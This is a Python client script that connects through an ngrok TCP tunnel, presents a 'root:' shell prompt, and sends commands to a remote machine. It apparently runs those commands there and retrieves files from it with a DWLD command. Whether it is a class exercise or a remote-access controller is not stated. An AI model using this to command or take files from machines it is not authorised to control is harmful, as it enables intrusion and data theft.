from socket import *

host = '4.tcp.eu.ngrok.io'
port = 16080
clientSocket = socket(AF_INET,SOCK_STREAM)
clientSocket.connect((host,port))
CurrentDirectory = '/'
while True:
    command = input(f'root:{CurrentDirectory}# ')
    clientSocket.send(command.encode())

    if command[:4] == "DWLD":
        tempPort =  clientSocket.recv(2048).decode()
        print('Receiving...')
        fileName = command.split()[1]
        print(fileName)
        
        tempClient = socket(AF_INET,SOCK_STREAM)
        tempClient.connect((host, int(tempPort)))
        
        data = b""
        downloadedBin = tempClient.recv(1048576)
        data += downloadedBin
        fileName += " DownLoaded"
        with open(fileName, "wb") as file:
            file.write(data)
        print('Done Recieving =)')
        tempClient.close()
    elif command[:2] == "CD":
        cleaned_data = clientSocket.recv(1024).decode()
        print(cleaned_data)
        if not (cleaned_data == 'ERROR! YOU DON\'T HAVE PERMISSION TO ACCESS THIS LOACATION\n' or cleaned_data == f'{command[3:]}: No such file or directory'):
            if command[3:] == '..' or command[3:] == '../':
                counter = len(CurrentDirectory)-2
                while(CurrentDirectory[counter]!='/'):
                    counter = counter -1
                CurrentDirectory =  CurrentDirectory[:counter+1]
            else:
                CurrentDirectory = CurrentDirectory + command[3:]+'/'
        

    else:
        print(clientSocket.recv(1024).decode())

clientSocket.close()
